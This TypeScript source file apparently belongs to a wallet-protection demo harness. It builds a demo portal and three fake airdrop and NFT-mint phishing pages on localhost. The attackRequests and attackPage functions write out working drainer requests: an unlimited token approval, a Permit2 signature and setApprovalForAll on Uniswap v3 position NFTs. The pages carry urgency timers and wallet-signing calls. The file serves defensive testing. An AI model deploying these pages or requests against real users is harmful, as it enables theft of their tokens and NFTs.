/**
 * Demo Portal helpers (served by the control server): the scenario links, a cached read of the protocol's ENS records,
 * the watcher's status (proxied, so the page needs no cross-origin call), and three scam pages on their own origin
 * ("unknown sites") that ask the wallet for what real drainer kits ask: an unlimited approve, a Permit2 signature,
 * and setApprovalForAll on the user's LP position NFTs.
 */
import { encodeFunctionData, parseAbi, type Address } from 'viem';
import { hijackRequest } from './hijack-request';
import { readCopeybaraRecords } from '@copeybara/ens';
import { createQuorum } from '@copeybara/quorum';

export const HOSTED_SITE = 'https://blackout-red.vercel.app';
/** The scam pages' host (served by the control server; *.localhost is loopback in browsers). */
export const SCAM_HOST = 'demoswap-airdrop.localhost';
/** Uniswap's Permit2 (same address on every chain) and the Sepolia Uniswap v3 position manager (the LP NFTs). */
export const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
export const SEPOLIA_NPM = '0x1238536071E1c677A632429e3655c799b22cDA52';

export interface PortalLinks {
  site: string;
  lookalike: string;
  approve: string;
  permit: string;
  nft: string;
  kit: string;
  hostedKit: string;
  website: string;
  watcher: string;
}

export function portalLinks(o: { ensName: string; ports: { router: number; hijack: number; control: number }; kitUrl?: string; watcherUrl?: string }): PortalLinks {
  const ens = encodeURIComponent(o.ensName);
  return {
    site: `http://demoswap.localhost:${o.ports.router}`,
    lookalike: `http://demoswap-rewards.localhost:${o.ports.hijack}/`,
    // their own origin: an "unknown site", not the portal and not a followed protocol
    approve: `http://${SCAM_HOST}:${o.ports.control}/drainer`,
    permit: `http://${SCAM_HOST}:${o.ports.control}/permit`,
    nft: `http://${SCAM_HOST}:${o.ports.control}/nft`,
    kit: `${o.kitUrl ?? 'http://localhost:8000'}/?ens=${ens}`,
    hostedKit: `${HOSTED_SITE}/copeybara-kit.html?ens=${ens}`,
    website: HOSTED_SITE,
    watcher: o.watcherUrl ?? 'http://127.0.0.1:8095/',
  };
}

export interface EnsSummary {
  ok: boolean;
  name: string;
  error?: string;
  url?: string | null;
  release?: { version: number; sha256: string };
  scripts?: number | null;
  contracts?: number;
  status?: string;
  note?: string;
  blocklist?: string[];
  block?: string;
  at: number;
}

/** ENS records through the quorum, cached for `ttlMs` (the portal polls). Never throws. */
export function ensReader(o: { ensName: string; ensRpcs: string[]; universalResolver: Address; chainId: number; ttlMs?: number }) {
  let cache: { v: EnsSummary; at: number } | null = null;
  let inflight: Promise<EnsSummary> | null = null;
  const ttl = o.ttlMs ?? 20_000;
  const read = async (): Promise<EnsSummary> => {
    try {
      const q = createQuorum({ urls: o.ensRpcs, expectedChainId: o.chainId, timeoutMs: 15_000 });
      const r = await readCopeybaraRecords(o.ensName, q, { universalResolver: o.universalResolver });
      return {
        ok: true,
        name: r.name,
        url: r.url,
        release: { version: r.release.version, sha256: r.release.sha256 },
        scripts: r.site ? r.site.length : null,
        contracts: Object.values(r.manifest.chains[String(o.chainId)] ?? {}).reduce((n, m) => n + Object.keys(m ?? {}).length, 0),
        status: r.status?.state ?? 'unreadable',
        note: r.status?.note,
        blocklist: r.blocklist,
        block: r.block.toString(),
        at: Date.now(),
      };
    } catch (e) {
      return { ok: false, name: o.ensName, error: (e as Error).message.split('\n')[0], at: Date.now() };
    }
  };
  return async (): Promise<EnsSummary> => {
    if (cache && Date.now() - cache.at < ttl) return cache.v;
    inflight ??= read().then((v) => {
      cache = { v, at: Date.now() };
      inflight = null;
      return v;
    });
    return inflight;
  };
}

/** The watcher's status JSON (scripts/watcher-live.sh), or { running: false }. */
export async function watcherStatus(url: string) {
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(1500) });
    if (!r.ok) return { running: false, url, error: `HTTP ${r.status}` };
    return { running: true, url, ...((await r.json()) as object) };
  } catch {
    return { running: false, url };
  }
}

/** The three attack pages (scenarios 4–6): what real drainer kits ask a wallet for. */
export function attackRequests(o: { token: Address; drainer: Address; chainId: number }): Record<'approve' | 'permit' | 'nft', { tx?: unknown; typedData?: unknown }> {
  const max160 = (1n << 160n) - 1n;
  const in30d = Math.floor(Date.now() / 1000) + 30 * 86400;
  return {
    approve: { tx: hijackRequest(o.token, o.drainer) },
    permit: {
      typedData: {
        types: {
          EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
          PermitSingle: [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
          PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }],
        },
        primaryType: 'PermitSingle',
        domain: { name: 'Permit2', chainId: o.chainId, verifyingContract: PERMIT2 },
        message: { details: { token: o.token, amount: max160.toString(), expiration: in30d, nonce: 0 }, spender: o.drainer, sigDeadline: String(in30d) },
      },
    },
    nft: {
      tx: {
        to: SEPOLIA_NPM,
        data: encodeFunctionData({ abi: parseAbi(['function setApprovalForAll(address,bool)']), functionName: 'setApprovalForAll', args: [o.drainer, true] }),
        value: '0x0',
      },
    },
  };
}

const PAGES = {
  approve: { title: 'Claim your DemoSwap airdrop', kicker: 'Season 1 airdrop', big: '2,500 DSWAP', sub: 'You provided liquidity on DemoSwap. Claim your share before the window closes.', cta: 'Claim airdrop', fine: 'asks your wallet for an unlimited token approval to the demo drainer' },
  permit: { title: 'Claim your DemoSwap airdrop', kicker: 'Gasless claim', big: '2,500 DSWAP', sub: 'No gas needed: sign one message and your tokens arrive in your wallet.', cta: 'Sign to claim (free)', fine: 'asks your wallet to sign a Permit2 permit that lets the demo drainer spend your tokens' },
  nft: { title: 'Mint your DemoSwap LP Pass', kicker: 'Free NFT airdrop', big: 'LP Pass #0417', sub: 'Every DemoSwap liquidity provider gets a free LP Pass with boosted rewards.', cta: 'Mint for free', fine: 'asks your wallet to let the demo drainer move ALL your Uniswap v3 position NFTs (setApprovalForAll)' },
} as const;

/** A plausible scam page on its own origin that asks the wallet for one drainer request. */
export function attackPage(kind: keyof typeof PAGES, req: { tx?: unknown; typedData?: unknown }, chainId: number) {
  const t = PAGES[kind];
  const chainHex = `0x${chainId.toString(16)}`;
  const ask = req.tx
    ? `await eth.request({ method: 'eth_sendTransaction', params: [{ ...REQ.tx, from }] });`
    : `await eth.request({ method: 'eth_signTypedData_v4', params: [from, JSON.stringify(REQ.typedData)] });`;
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>${t.title}</title>
<style>
:root{color-scheme:light dark}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(900px 500px at 20% 0%,#4b5cf0 0%,transparent 60%),radial-gradient(800px 500px at 100% 100%,#b04bf0 0%,transparent 55%),#0d1030;color:#fff;font:16px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif}
.box{width:min(440px,calc(100vw - 32px));padding:30px;border-radius:22px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16);backdrop-filter:blur(14px);text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.4)}
.logo{display:flex;justify-content:center;align-items:center;gap:8px;font-weight:700;font-size:15px;opacity:.9}
.kicker{display:inline-block;margin:18px 0 6px;padding:3px 10px;border-radius:999px;background:rgba(255,216,77,.16);color:#ffd84d;font-size:12px;font-weight:700;letter-spacing:.06em;text-transform:uppercase}
h1{margin:4px 0 6px;font-size:26px;letter-spacing:-.02em}.big{font-size:40px;font-weight:800;letter-spacing:-.02em;margin:14px 0 4px}
.sub{opacity:.8;margin:0 0 20px}.timer{font-size:13px;opacity:.7;margin-bottom:16px}
button{width:100%;padding:15px;border:0;border-radius:14px;background:linear-gradient(90deg,#ffd84d,#ffb020);color:#1d1440;font:inherit;font-weight:800;cursor:pointer}
#result{min-height:1.5em;margin:14px 0 0;font-size:14px;opacity:.9}.fine{font-size:11.5px;opacity:.55;margin-top:18px}
</style></head><body>
<div class="box" data-attack-page="${kind}">
  <div class="logo"><svg width="22" height="22" viewBox="0 0 28 28"><rect width="28" height="28" rx="8" fill="#3b4fd8"/><path d="M8 11h9l-3-3M20 17h-9l3 3" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>DemoSwap Rewards</div>
  <div class="kicker">${t.kicker}</div>
  <h1>${t.title}</h1>
  <div class="big">${t.big}</div>
  <p class="sub">${t.sub}</p>
  <div class="timer">Claim window closes in 00:14:59</div>
  <button id="go">${t.cta}</button>
  <p id="result"></p>
  <p class="fine">Demo attack page served by the Copeybara harness: it ${t.fine}, exactly like a real drainer kit.</p>
</div>
<script>
const REQ = ${JSON.stringify(req)};
const out = document.getElementById('result');
document.getElementById('go').onclick = async () => {
  const eth = window.ethereum;
  if (!eth) { out.textContent = 'No wallet found in this browser.'; return; }
  try {
    const [from] = await eth.request({ method: 'eth_requestAccounts' });
    try { await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '${chainHex}' }] }); } catch (e) {}
    out.textContent = 'Confirm in your wallet to claim…';
    ${ask}
    out.textContent = 'sent';
  } catch (e) {
    out.textContent = 'error ' + (e && e.code);
  }
};
</script></body></html>`;
}
